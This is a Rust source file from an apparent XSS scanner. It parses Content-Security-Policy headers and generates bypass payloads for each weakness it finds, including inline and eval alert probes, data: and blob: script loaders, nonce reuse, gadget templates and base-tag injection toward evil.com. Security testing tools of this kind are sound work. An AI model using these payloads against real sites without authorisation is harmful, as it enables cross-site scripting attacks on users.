//! CSP bypass payloads generated based on Content-Security-Policy analysis.
//!
//! These payloads exploit specific weaknesses in CSP configurations:
//! - `unsafe-inline`: Direct inline script execution
//! - `unsafe-eval`: eval()-based execution
//! - Missing `base-uri`: `<base>` tag injection to redirect relative URLs
//! - Missing `object-src`: Plugin-based execution
//! - Whitelisted CDN domains: JSONP/Angular/etc. gadgets on allowed origins
//!   (sourced from [`crate::payload::gadget_db`])
//! - `data:` scheme allowed in script-src
//! - `strict-dynamic` with nonce/hash: DOM script-gadget injection + nonce reuse
//! - `require-trusted-types-for` / `trusted-types`: parsed for awareness so a
//!   nonce/hash-only CSP is classified hardened-vs-gadget-bypassable

use crate::scanning::markers;

/// Parsed CSP directives relevant to XSS bypass.
#[derive(Debug, Clone, Default)]
pub struct CspAnalysis {
    pub has_unsafe_inline: bool,
    pub has_unsafe_eval: bool,
    pub has_strict_dynamic: bool,
    pub allows_data_scheme: bool,
    pub allows_blob_scheme: bool,
    pub missing_base_uri: bool,
    pub missing_object_src: bool,
    pub missing_script_src: bool,
    pub whitelisted_domains: Vec<String>,
    /// Base64 values of every `'nonce-…'` source expression in `script-src`
    /// (the token between `'nonce-` and the closing quote, case preserved).
    /// A reflected or otherwise predictable nonce lets an injected
    /// `<script nonce=…>` execute even under `strict-dynamic`.
    pub nonce_values: Vec<String>,
    /// Full `sha256-…` / `sha384-…` / `sha512-…` tokens (without the quotes)
    /// from `script-src`. Presence marks a hash-pinned CSP.
    pub hash_values: Vec<String>,
    /// `true` when `require-trusted-types-for 'script'` is enforced, so the
    /// browser routes every DOM-XSS sink string through a Trusted Types policy.
    /// Threaded into the AST DOM analyzer to gate default-policy suppression.
    pub require_trusted_types_for: bool,
    /// The `trusted-types` directive's allow-list values when present
    /// (policy names, plus keywords like `'none'` / `'allow-duplicates'` with
    /// quotes stripped). `Some(empty)` means `trusted-types;` with no value,
    /// which forbids creating any policy. `None` means the directive is absent.
    pub trusted_types: Option<Vec<String>>,
}

impl CspAnalysis {
    /// `true` when `script-src` is pinned to nonces and/or hashes — the modern
    /// allowlist-free shape. On its own this is the *hardened* form; it only
    /// becomes gadget-bypassable when paired with `strict-dynamic`, a reflected
    /// nonce, or a whitelisted host (see [`is_gadget_bypassable`]).
    ///
    /// [`is_gadget_bypassable`]: CspAnalysis::is_gadget_bypassable
    pub fn is_nonce_or_hash_based(&self) -> bool {
        !self.nonce_values.is_empty() || !self.hash_values.is_empty()
    }

    /// `true` when the script policy is realistically defeatable by a script
    /// gadget: `unsafe-inline`/`unsafe-eval` (trivially), a `strict-dynamic`
    /// policy (DOM script-gadget), or a whitelisted host that serves a known
    /// JSONP/gadget endpoint.
    ///
    /// A bare nonce/hash is deliberately *not* treated as bypassable here: a
    /// per-response random nonce is the hardened shape, and nonce reuse only
    /// works when the nonce is predictable or reflected — a contingency we
    /// can't read off the header. (Under `strict-dynamic` we still emit a
    /// best-effort reuse payload, but that path is gated on `has_strict_dynamic`.)
    pub fn is_gadget_bypassable(&self) -> bool {
        if self.missing_script_src || self.has_unsafe_inline || self.has_unsafe_eval {
            return true;
        }
        if self.has_strict_dynamic {
            return true;
        }
        self.whitelisted_domains.iter().any(|d| {
            crate::payload::gadget_db::gadgets_for_host(d)
                .next()
                .is_some()
        })
    }

    /// `true` when `script-src` is a genuinely hardened nonce/hash policy with
    /// no escape hatch we know how to bypass: nonce/hash based, no
    /// `strict-dynamic`, no `unsafe-*`, and no whitelisted gadget host. Useful
    /// for reporting/telemetry; the payload generator simply emits nothing
    /// actionable in this case.
    pub fn is_hardened(&self) -> bool {
        self.is_nonce_or_hash_based() && !self.is_gadget_bypassable()
    }
}

/// Parse a CSP header value into an analysis struct.
pub fn analyze_csp(csp_value: &str) -> CspAnalysis {
    let mut analysis = CspAnalysis::default();

    let directives: Vec<&str> = csp_value.split(';').map(str::trim).collect();

    let mut has_script_src = false;
    let mut has_default_src = false;
    let mut has_base_uri = false;
    let mut has_object_src = false;

    for directive in &directives {
        let parts: Vec<&str> = directive.split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }
        let name = parts[0].to_ascii_lowercase();
        let values: Vec<&str> = parts[1..].to_vec();

        match name.as_str() {
            "script-src" | "script-src-elem" => {
                has_script_src = true;
                for v in &values {
                    let lower = v.to_ascii_lowercase();
                    if lower == "'unsafe-inline'" {
                        analysis.has_unsafe_inline = true;
                    }
                    if lower == "'unsafe-eval'" {
                        analysis.has_unsafe_eval = true;
                    }
                    if lower == "'strict-dynamic'" {
                        analysis.has_strict_dynamic = true;
                    }
                    if lower == "data:" {
                        analysis.allows_data_scheme = true;
                    }
                    if lower == "blob:" {
                        analysis.allows_blob_scheme = true;
                    }
                    // `'nonce-<base64>'` — capture the base64 (case-sensitive,
                    // so read from the original token, not the lowercased one).
                    if let Some(nonce) = parse_nonce_token(v, &lower) {
                        analysis.nonce_values.push(nonce);
                    }
                    // `'sha256-…'` / `'sha384-…'` / `'sha512-…'`.
                    if let Some(hash) = parse_hash_token(v, &lower) {
                        analysis.hash_values.push(hash);
                    }
                    // Collect whitelisted domains (not keywords). Nonce/hash
                    // tokens start with `'` so they're excluded here too.
                    if !lower.starts_with('\'')
                        && lower != "data:"
                        && lower != "blob:"
                        && lower != "*"
                    {
                        analysis.whitelisted_domains.push(v.to_string());
                    }
                }
            }
            "default-src" => {
                has_default_src = true;
                for v in &values {
                    let lower = v.to_ascii_lowercase();
                    if lower == "'unsafe-inline'" {
                        analysis.has_unsafe_inline = true;
                    }
                    if lower == "'unsafe-eval'" {
                        analysis.has_unsafe_eval = true;
                    }
                }
            }
            "base-uri" => {
                has_base_uri = true;
            }
            "object-src" => {
                has_object_src = true;
            }
            "require-trusted-types-for" => {
                // The only defined value is `'script'`; its presence enforces
                // Trusted Types on DOM-XSS sinks.
                for v in &values {
                    if v.trim_matches('\'').eq_ignore_ascii_case("script") {
                        analysis.require_trusted_types_for = true;
                    }
                }
            }
            "trusted-types" => {
                // Record the allow-list (policy names / keywords, quotes
                // stripped). `trusted-types;` with no value → `Some(empty)`.
                let collected: Vec<String> = values
                    .iter()
                    .map(|s| s.trim_matches('\'').to_string())
                    .filter(|s| !s.is_empty())
                    .collect();
                analysis.trusted_types = Some(collected);
            }
            _ => {}
        }
    }

    analysis.missing_script_src = !has_script_src && !has_default_src;
    analysis.missing_base_uri = !has_base_uri;
    analysis.missing_object_src = !has_object_src;

    analysis
}

/// Extract the base64 payload of a `'nonce-<base64>'` source expression. The
/// nonce is case-sensitive, so it is sliced from the original `token` while the
/// already-lowercased `lower` drives the (case-insensitive) prefix/suffix match.
fn parse_nonce_token(token: &str, lower: &str) -> Option<String> {
    const PREFIX: &str = "'nonce-";
    if lower.starts_with(PREFIX) && lower.ends_with('\'') && token.len() > PREFIX.len() {
        let inner = &token[PREFIX.len()..token.len() - 1];
        if !inner.is_empty() {
            return Some(inner.to_string());
        }
    }
    None
}

/// Extract a `sha256-…` / `sha384-…` / `sha512-…` token (algorithm prefix kept,
/// surrounding quotes dropped) from a hash source expression.
fn parse_hash_token(token: &str, lower: &str) -> Option<String> {
    let is_hash = lower.starts_with("'sha256-")
        || lower.starts_with("'sha384-")
        || lower.starts_with("'sha512-");
    if is_hash && lower.ends_with('\'') && token.len() > 2 {
        return Some(token[1..token.len() - 1].to_string());
    }
    None
}

/// Generate CSP bypass payloads based on CSP analysis.
pub fn get_csp_bypass_payloads(analysis: &CspAnalysis) -> Vec<String> {
    let class_marker = markers::class_marker();
    let id_marker = markers::id_marker();
    let mut payloads = Vec::new();

    // No script-src or default-src → CSP doesn't restrict scripts at all
    if analysis.missing_script_src {
        payloads.push(format!("<script class={}>alert(1)</script>", class_marker));
        payloads.push(format!(
            "<img src=x onerror=alert(1) class={}>",
            class_marker
        ));
        return payloads;
    }

    // unsafe-inline: direct inline script/event handler execution
    if analysis.has_unsafe_inline {
        payloads.push(format!("<script class={}>alert(1)</script>", class_marker));
        payloads.push(format!(
            "<img src=x onerror=alert(1) class={}>",
            class_marker
        ));
        payloads.push(format!("<svg onload=alert(1) class={}>", class_marker));
        payloads.push(format!(
            "<div onmouseover=alert(1) class={}>hover</div>",
            class_marker
        ));
    }

    // unsafe-eval: eval-based payloads
    if analysis.has_unsafe_eval {
        payloads.push(format!(
            "<img src=x onerror=eval('alert(1)') class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=setTimeout('alert(1)') class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=Function('alert(1)')() class={}>",
            class_marker
        ));
        payloads.push(format!(
            "<img src=x onerror=new%20Function('alert(1)')() id={}>",
            id_marker
        ));
    }

    // data: scheme allowed → script src with data URI
    if analysis.allows_data_scheme {
        payloads.push(format!(
            "<script src=\"data:text/javascript,alert(1)\" class={}></script>",
            class_marker
        ));
        payloads.push(format!(
            "<script src=\"data:;base64,YWxlcnQoMSk=\" class={}></script>",
            class_marker
        ));
        payloads.push(format!(
            "<iframe src=\"data:text/html,<script>alert(1)</script>\" class={}></iframe>",
            class_marker
        ));
    }

    // blob: scheme allowed
    if analysis.allows_blob_scheme {
        payloads.push(format!(
            "<script class={}>{{var b=new Blob(['alert(1)'],{{type:'text/javascript'}});var u=URL.createObjectURL(b);var s=document.createElement('script');s.src=u;document.head.appendChild(s)}}</script>",
            class_marker
        ));
    }

    // Missing base-uri → base tag injection to hijack relative script loads
    if analysis.missing_base_uri {
        payloads.push(format!(
            "<base href=\"https://evil.com/\" class={}>",
            class_marker
        ));
        payloads.push(format!("<base href=\"//evil.com/\" id={}>", id_marker));
    }

    // Missing object-src → object/embed injection
    if analysis.missing_object_src {
        payloads.push(format!(
            "<object data=\"data:text/html,<script>alert(1)</script>\" class={}></object>",
            class_marker
        ));
        payloads.push(format!(
            "<embed src=\"data:text/html,<script>alert(1)</script>\" class={}>",
            class_marker
        ));
    }

    // Script gadgets. `strict-dynamic` makes the browser *ignore* the host
    // allowlist, so a plain `<script src=allowed-host>` no longer loads — only
    // DOM script-gadgets (a trusted script creating the attacker script) and
    // nonce reuse survive. Without `strict-dynamic`, a whitelisted host that
    // serves a JSONP/gadget endpoint is directly loadable.
    if analysis.has_strict_dynamic {
        // Nonce reuse: an injected <script> bearing a captured nonce executes
        // when that nonce is static / predictable / reflected into the sink.
        for nonce in &analysis.nonce_values {
            payloads.push(format!(
                "<script nonce={} class={}>alert(1)</script>",
                nonce, class_marker
            ));
            payloads.push(format!(
                "<script nonce={} src=\"data:text/javascript,alert(1)\" id={}></script>",
                nonce, id_marker
            ));
        }
        // DOM script-gadgets that survive strict-dynamic.
        for gadget in crate::payload::gadget_db::strict_dynamic_gadgets() {
            payloads.push(crate::payload::gadget_db::render(
                gadget.template,
                class_marker,
                id_marker,
            ));
        }
    } else {
        // Host-allowlist CSP: emit the gadgets whose host pattern matches an
        // allowed origin (replaces the former hardcoded CDN branches).
        for domain in &analysis.whitelisted_domains {
            for gadget in crate::payload::gadget_db::gadgets_for_host(domain) {
                payloads.push(crate::payload::gadget_db::render(
                    gadget.template,
                    class_marker,
                    id_marker,
                ));
            }
        }
    }

    dedup_preserve_order(payloads)
}

/// De-duplicate payloads while preserving first-occurrence order. The gadget DB
/// can yield the same template for several matching host patterns (e.g. a
/// `jquery`/`ajax.googleapis.com` double match), so collapse repeats to keep the
/// per-parameter request count from growing.
fn dedup_preserve_order(payloads: Vec<String>) -> Vec<String> {
    let mut seen = std::collections::HashSet::with_capacity(payloads.len());
    payloads
        .into_iter()
        .filter(|p| seen.insert(p.clone()))
        .collect()
}

#[cfg(test)]
mod tests;
